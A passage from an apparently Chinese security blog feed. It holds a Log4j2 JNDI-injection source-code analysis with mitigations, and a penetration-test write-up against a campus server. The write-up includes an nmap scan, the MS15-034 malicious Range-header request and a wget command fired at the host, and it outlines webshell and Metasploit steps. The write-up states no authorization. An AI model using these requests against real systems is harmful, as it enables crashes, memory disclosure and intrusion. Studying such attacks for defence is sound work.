class="line"><span class="comment"> * used as prefix separator). It then passes the name of the variable with</span></span><br><span class="line"><span class="comment"> * the prefix stripped to the lookup object registered for this prefix. If</span></span><br><span class="line"><span class="comment"> * no prefix can be found or if the associated lookup object cannot resolve</span></span><br><span class="line"><span class="comment"> * this variable, the default lookup object will be used.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event The current LogEvent or null.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> var the name of the variable whose value is to be looked up</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the value of this variable or &lt;b&gt;null&lt;/b&gt; if it cannot be</span></span><br><span class="line"><span class="comment"> * resolved</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/12.png"></p><p>lookup方法中完成变量的解析并返回，如上图所示，已将sys:user.name解析成系统用户名。</p><h3 id="字符串查询"><a href="#字符串查询" class="headerlink" title="字符串查询"></a>字符串查询</h3><p>如上lookup方法所属的类Interpolator主要用于代理多个StrLookup实例，它提供统一的字符串查找功能。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/13.png"></p><p>PREFIX_SEPARATOR是前缀分隔符，默认是一个冒号。</p><p>在使用Interpolator(java.util.Map&lt;java.lang.String,java.lang.String&gt;)构造方法实例化该类时，会创建并注册多个内置的StrLookup实例到strLookupMap中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates the Interpolator using only Lookups that work without an event and initial properties.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Interpolator</span><span class="params">(<span class="keyword">final</span> Map&lt;String, String&gt; properties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.defaultLookup = <span class="keyword">new</span> <span class="title class_">MapLookup</span>(properties == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;() : properties);</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> this ought to use the PluginManager</span></span><br><span class="line">    strLookupMap.put(<span class="string">&quot;log4j&quot;</span>, <span class="keyword">new</span> <span class="title class_">Log4jLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;sys&quot;</span>, <span class="keyword">new</span> <span class="title class_">SystemPropertiesLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;env&quot;</span>, <span class="keyword">new</span> <span class="title class_">EnvironmentLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;marker&quot;</span>, <span class="keyword">new</span> <span class="title class_">MarkerLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;java&quot;</span>, <span class="keyword">new</span> <span class="title class_">JavaLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;lower&quot;</span>, <span class="keyword">new</span> <span class="title class_">LowerLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;upper&quot;</span>, <span class="keyword">new</span> <span class="title class_">UpperLookup</span>());</span><br><span class="line">    <span class="comment">// JNDI</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [LOG4J2-703] We might be on Android</span></span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_JNDI,</span><br><span class="line">            Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> LinkageError | Exception e) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_JNDI, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// JMX input args</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// We might be on Android</span></span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_JVMRUNARGS,</span><br><span class="line">            Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>,</span><br><span class="line">                    StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> LinkageError | Exception e) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_JVMRUNARGS, e);</span><br><span class="line">    &#125;</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;date&quot;</span>, <span class="keyword">new</span> <span class="title class_">DateLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;ctx&quot;</span>, <span class="keyword">new</span> <span class="title class_">ContextMapLookup</span>());</span><br><span class="line">    <span class="keyword">if</span> (Constants.IS_WEB_APP) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            strLookupMap.put(LOOKUP_KEY_WEB,</span><br><span class="line">                Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ignored) &#123;</span><br><span class="line">            handleError(LOOKUP_KEY_WEB, ignored);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_DOCKER,</span><br><span class="line">            Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ignored) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_DOCKER, ignored);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_SPRING,</span><br><span class="line">                Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ignored) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_SPRING, ignored);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_KUBERNETES,</span><br><span class="line">                Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception | NoClassDefFoundError error) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_KUBERNETES, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如上面的sys:user.name，所对应的就是SystemPropertiesLookup。不光如此，还有jndi类型的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOOKUP_KEY_JNDI</span> <span class="operator">=</span> <span class="string">&quot;jndi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// JNDI</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// [LOG4J2-703] We might be on Android</span></span><br><span class="line">    strLookupMap.put(LOOKUP_KEY_JNDI,</span><br><span class="line">        Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">final</span> LinkageError | Exception e) &#123;</span><br><span class="line">    handleError(LOOKUP_KEY_JNDI, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当日志消息中包含jndi关键词时，消息便会交由org.apache.logging.log4j.core.lookup.JndiLookup进行查询。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/14.png"></p><p>在JndiLookup#lookup方法中，用到了jndiManager.lookup方法来对一个jndiName进行查询。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/15.png"></p><h3 id="JNDI查询"><a href="#JNDI查询" class="headerlink" title="JNDI查询"></a>JNDI查询</h3><p>org.apache.logging.log4j.core.net.JndiManager是Log4j2中用于管理JNDI上下文的类。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/16.png"></p><p>在JndiLookup#lookup方法中调用了JndiManager的getDefaultManager方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager()</span><br></pre></td></tr></table></figure><p>在getDefaultManager会调用内部类JndiManagerFactory创建JndiManager实例，在其中创建了一个InitialContext，作为JndiManager对象的成员变量context。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JndiManagerFactory</span> <span class="variable">FACTORY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiManagerFactory</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Context context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">JndiManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Context context)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="literal">null</span>, name);</span><br><span class="line">    <span class="built_in">this</span>.context = context;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the default JndiManager using the default &#123;<span class="doctag">@link</span> javax.naming.InitialContext&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the default JndiManager</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getManager(JndiManager.class.getName(), FACTORY, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">JndiManagerFactory</span> <span class="keyword">implements</span> <span class="title class_">ManagerFactory</span>&lt;JndiManager, Properties&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JndiManager <span class="title function_">createManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Properties data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JndiManager</span>(name, <span class="keyword">new</span> <span class="title class_">InitialContext</span>(data));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Error creating JNDI InitialContext.&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在JndiManager#lookup方法中，则调用了this.context.lookup方法进行无限制的JDNI查询，此处便是导致JDNI攻击的最终触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Looks up a named object through this JNDI context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name name of the object to look up.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;  the type of the object.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the named object if it could be located.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  NamingException if a naming exception is encountered</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><ul><li>关闭字符串解析查询功能，在配置文件中设置log4j2.formatMsgNoLookups为True。</li><li>禁用JDNI功能，或升级Java版本至6u211、7u201、8u191、11.0.1以防御JNDI注入攻击。不过依旧会受到带外信息泄漏的影响。</li><li>限制受影响应用访问外部互联网。</li></ul><h3 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h3><p>升级Log4j2至2.15.0版本，可一劳永逸。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
            <tag> log4j </tag>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对校园某服务器的一次渗透测试</title>
      <link href="/pentest-for-campus-server.html"/>
      <url>/pentest-for-campus-server.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E5%89%8D%E6%9C%9F%E4%BA%A4%E4%BA%92%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">0x00 前期交互及信息收集</a></li><li><a href="#0x01-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">0x01 远程代码执行？？？</a><ul><li><a href="#ms15-034%E5%A4%8D%E7%8E%B0">MS15-034复现</a></li><li><a href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8%E5%8D%B1%E5%AE%B3">进一步利用&#x2F;危害</a></li></ul></li><li><a href="#0x02-%E7%94%B1-phpmyadmin-%E5%85%A5%E6%89%8B">0x02 由 phpMyAdmin 入手</a><ul><li><a href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4">目录爆破</a></li><li><a href="#cve-2016-5734">CVE-2016-5734</a></li><li><a href="#%E5%AF%BB%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%A4%96%E5%86%99%E6%9C%A8%E9%A9%AC">寻绝对路径，外写木马</a></li></ul></li><li><a href="#0x03-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">0x03 后渗透测试</a><ul><li><a href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91">中国蚁剑</a></li><li><a href="#%E8%BF%9E%E6%8E%A5-metasploit">连接 Metasploit</a></li></ul></li></ul><blockquote><p>发现学校其中一台服务器<del>可能</del>（<strong>绝对</strong>）存在漏洞。我想（<strong>绝对</strong>）能拿下它；</p><p>而且渗透测试的过程很有趣，便将其记录下来。</p></blockquote><h2 id="0x00-前期交互及信息收集"><a href="#0x00-前期交互及信息收集" class="headerlink" title="0x00 前期交互及信息收集"></a>0x00 前期交互及信息收集</h2><p>由于是对内网直接进行大扫描，所以直接判断这不仅是一个 Web 服务器（多个），同时还运行着 FTP、数据库。</p><p>在此，再次使用 nmap 扫描一次，结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -T4 -n -sS -sV -O 192.168.3.72</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.72</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Not shown: 974 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">7/tcp     open     <span class="built_in">echo</span></span><br><span class="line">9/tcp     open     discard?</span><br><span class="line">13/tcp    open     daytime?</span><br><span class="line">17/tcp    open     qotd           Windows qotd (English)</span><br><span class="line">19/tcp    open     chargen</span><br><span class="line">21/tcp    open     ftp            FileZilla ftpd</span><br><span class="line">42/tcp    open     tcpwrapped</span><br><span class="line">80/tcp    open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">999/tcp   open     http           Apache httpd 2.4.33 ((Win32) OpenSSL/<span class="number">1.0</span>.<span class="number">2</span>o mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span> mod_jk/<span class="number">1.2</span>.<span class="number">40</span>)</span><br><span class="line"><span class="number">1801</span>/tcp  open     msmq?</span><br><span class="line"><span class="number">2107</span>/tcp  open     msrpc          Microsoft Windows RPC</span><br><span class="line"><span class="number">2383</span>/tcp  open     ms-olap4?</span><br><span class="line"><span class="number">3306</span>/tcp  open     mysql          MySQL <span class="number">5.5</span>.<span class="number">19</span></span><br><span class="line"><span class="number">3389</span>/tcp  open     ms-wbt-server?</span><br><span class="line"><span class="number">8009</span>/tcp  open     ajp13          Apache Jserv (Protocol v1.<span class="number">3</span>)</span><br><span class="line"><span class="number">8080</span>/tcp  open     http           Apache Tomcat/Coyote JSP engine <span class="number">1.1</span></span><br><span class="line"><span class="number">8082</span>/tcp  open     http           Microsoft IIS httpd <span class="number">7.5</span></span><br><span class="line"><span class="number">49152</span>/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port13-TCP:V=<span class="number">7.70</span>%I=<span class="number">7</span>%D=<span class="number">8</span>/<span class="number">13</span>%Time=<span class="number">5</span>D53656C%P=x86_64-unknown-linux-gnu%r</span><br><span class="line">SF:(NULL,<span class="number">12</span>,&quot;<span class="number">23</span>:<span class="number">35</span>:<span class="number">37</span>\x202019/<span class="number">8</span>/<span class="number">13</span>\n&quot;)%r(NCP,<span class="number">12</span>,&quot;<span class="number">23</span>:<span class="number">35</span>:<span class="number">37</span>\x202019/<span class="number">8</span>/<span class="number">13</span>\n&quot;);</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows Vista|<span class="number">2008</span>|<span class="number">7</span></span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows Vista SP1 - SP2, Windows Server <span class="number">2008</span> SP2, or Windows <span class="number">7</span></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><p>乍一看，跑了这么多服务。初步判断很可能有 <strong>vulnerabilities</strong>。</p><p>总结，这是一台操作系统为 <strong>Windows</strong>（目前未能确认具体版本）的，运行着 FileZilla FTP、MySQL 5.5.19、Web等服务；而且开放了太多端口。</p><p>Web 服务器端口：<del>80</del>、999、<del>8080</del>、8082；运行着这么几个 Web 服务。</p><p>不过经确认，只有 <strong>999 Apache</strong> 和 <strong>8082 IIS</strong> 两个端口提供的 Web 服务正常。</p><p>且，999 端口运行着 <strong>phpMyAdmin</strong>（一个以 PHP 为基础，以基于Web方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库），当然也是漏洞多多。</p><h2 id="0x01-远程代码执行？？？"><a href="#0x01-远程代码执行？？？" class="headerlink" title="0x01 远程代码执行？？？"></a>0x01 远程代码执行？？？</h2><p>在<del>一顿瞎操作下</del>，其实是利用扫描器加手动验证；找到一个致命漏洞，该漏洞存在于端口 <strong>8082 IIS</strong> 服务器上。</p><h3 id="MS15-034复现"><a href="#MS15-034复现" class="headerlink" title="MS15-034复现"></a>MS15-034复现</h3><p><strong>HTTP.sys 远程执行代码漏洞 - CVE-2015-1635</strong></p><blockquote><p>当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p><p>若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，此更新可以修复此漏洞。</p><p><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2015/ms15-034#vulnerability-in-httpsys-could-allow-remote-code-execution-3042553">https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2015/ms15-034#vulnerability-in-httpsys-could-allow-remote-code-execution-3042553</a></p></blockquote><p>根据微软安全公告，此漏洞貌似可以远程任意代码执行；但就实际复现来说，好像并不成立。</p><p>通过给 <strong>IIS</strong> 服务器发送如下 HTTP 请求，便可触发这个漏洞。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>stuff</span><br><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-18446744073709551615</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而我就直接使用的 <strong>wget</strong> 测试此漏洞，当然还可以使用 <strong>curl</strong> 和 <strong>MSF</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget --header=<span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span> http://192.168.3.72:8082/Images/top01.gif                                         </span><br><span class="line">--2019-08-13 23:44:03--  http://192.168.3.72:8082/Images/top01.gif</span><br><span class="line">Connecting to 192.168.3.72:8082... connected.</span><br><span class="line">HTTP request sent, awaiting response... 416 Requested Range Not Satisfiable</span><br><span class="line">    The file is already fully retrieved; nothing to <span class="keyword">do</span>.</span><br></pre></td></tr></table></figure><p>如上请求包，若IIS服务器返回 “<strong>Requested Range Not Satisfiable</strong>“，则是存在漏洞，否则如果返回 “The request has an invalid header name”，则说明漏洞已经修补。</p><h3 id="进一步利用-x2F-危害"><a href="#进一步利用-x2F-危害" class="headerlink" title="进一步利用&#x2F;危害"></a>进一步利用&#x2F;危害</h3><p>前面的远程任意代码执行并不成立；此漏洞就当前利用来说，只能造成两种危害。</p><p>我使用 <strong>MSF</strong> 来 <strong>exploit</strong> 利用方式。</p><p>如下，使用 MSF 读取服务器内核内存数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 